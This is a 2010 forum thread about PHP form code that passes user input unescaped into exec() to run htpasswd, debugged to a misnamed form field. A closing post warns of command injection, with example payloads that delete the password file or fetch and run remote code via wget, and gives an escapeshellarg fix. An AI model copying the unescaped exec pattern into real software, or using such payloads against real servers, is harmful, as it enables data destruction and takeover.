---
title: "Php"
date: 2010-02-08
forum: Programming Talk
---

### Post by lewisforlife on 2010-02-08
Here is a snippet of php code, that is not working.  I have a form that asks for username and password, and I want to add it to a password file.  But this is not working.  I get no output except for:
**Processing...**

 		array(0) { } 	

```
<html>
    <head>
        <title>Processing...</title>
    </head>
    <body>
        <h1>Processing...</h1>
        <?php
            $name = $_POST ['name'];
            $pass = $_POST ['pass'];

            $output = array ();

            exec ("/usr/bin/htpasswd -b /var/www/dirtpos/passwd/passwords " . $name . " " . $pass, $output);

            var_dump ($output);
        ?>
    </body>
</html>
```

Even if I do:

```
passthru ("fortune");
```

I get no output.  Is there some options that I have to set to be able to execute system commands from php?

---

### Post by john newbuntu on 2010-02-09
One of those cases where output goes to stderr.  Change your code segment to this:

```
"/usr/bin/htpasswd -b /var/www/dirtpos/passwd/passwords " . $name . " " . $pass . " 2>&1"

```

---

### Post by lewisforlife on 2010-02-09
> **john newbuntu said:**
> One of those cases where output goes to stderr.  Change your code segment to this:

```
"/usr/bin/htpasswd -b /var/www/dirtpos/passwd/passwords " . $name . " " . $pass . " 2>&1"

```

I tried your example and still the user and pass do not get added to my password file.  Like I said, it doesn't look like, exec, passthru, shell_exec etc... are working at all, is there some kind of php or apache setting that I have to set in order for these to work?

---

### Post by lewisforlife on 2010-02-09
I have looked at /etc/php5/apache2/php.ini and exec, passthru etc. are not listed under disable_functions.  Anyone know anywhere else to look?

---

### Post by sharpdust on 2010-02-09
I have not used htpasswd. Is it supposed to actually generate output (be verbose).

Two options I suggest:
One, try the same command but with something you're confident will produce output:

```
exec('whoami', $output = array());

var_dump($output);
```

Alternatively, you could use exec's third paramater and collect the return value. Anything other than a 0 should be an error.

---

### Post by lewisforlife on 2010-02-09
> **sharpdust said:**
> I have not used htpasswd. Is it supposed to actually generate output (be verbose).

Two options I suggest:
One, try the same command but with something you're confident will produce output:

```
exec('whoami', $output = array());

var_dump($output);
```

Alternatively, you could use exec's third paramater and collect the return value. Anything other than a 0 should be an error.

I have done that now and "www-data" is returned, so I guess exec is not disabled.  I have now looked in my /var/log/apache2/error.log and have this output, so it looks like the command is trying to work:

```
Usage:
 htpasswd [-cmdpsD] passwordfile username
 htpasswd -b[cmdpsD] passwordfile username password

 htpasswd -n[mdps] username
 htpasswd -nb[mdps] username password
-c Create a new file
-n Don't update file; display results on stdout
-m Force MD5 encryption o fthe password.
-d Force Crypt encryption o of the password
-p Do not encrypt the password (plaintext).
-s Force SHA encryption of the password.
-b Use the password from the command line rather than prompting for it.
-D Delete the specific user.
On Windows, NetWare and TPF systems the 'm' flag is used by default.
On all other systems, the '-p' flag will probably not work
```

I am fairly certain that I have the correct syntax of the command, does anyone have any insight why this is not working?

---

### Post by Zugzwang on 2010-02-09
> **lewisforlife said:**
> 
I am fairly certain that I have the correct syntax of the command, does anyone have any insight why this is not working?

Why don't you try printing out the stuff you are feeding to the exec-command instead of executing it? Then you can see how precisely htpasswd is called.

---

### Post by lewisforlife on 2010-02-09
My problem was on my html page with my form.  My password field was not named "pass", I should have posted that page also.  Thanks for all of the help though.  This thread is solved.

(Thanks Zugzwang, that is what I did to find my issue)

---

### Post by tomchuk on 2010-02-09
A little security note - you should always be paranoid around exec and friends. Dropping posted data straight into exec is a serious security issue.

If I posted "; rm /var/www/dirtpos/passwd/passwords" as pass, goodbye password file. Likewise "; wget -O /tmp/code [http://some.site/code](http://some.site/code) && /tmp/code" and I'm now running arbitrary code on your machine. Combine executing random code as www-data with a local privilege escalation vulnerability (eg. do_brk or recent sock_sendpage NULL pointer dereference) an attacker now has root on your server.

As a rule, everything you pass to exec (and passthru, ``, etc.) should go through [escapeshellcmd](http://us.php.net/manual/en/function.escapeshellcmd.php) and [escapeshellarg](http://us.php.net/manual/en/function.escapeshellarg.php).

Use something like this:

[php]
function safe_exec($cmd, $args){
  $cmd = escapeshellcmd($cmd);
  $args = array_map('escapeshellarg', $args);
  $out = array();
  exec($cmd . ' ' . implode(' ', $args), $out);
  return $out;
}

$cmd = '/usr/bin/htpasswd';
$args = array(
  '-b',
  '/var/www/dirtpos/passwd/passwords',
  $name,
  $pass,
);
safe_exec($cmd, $args);[/php]

---

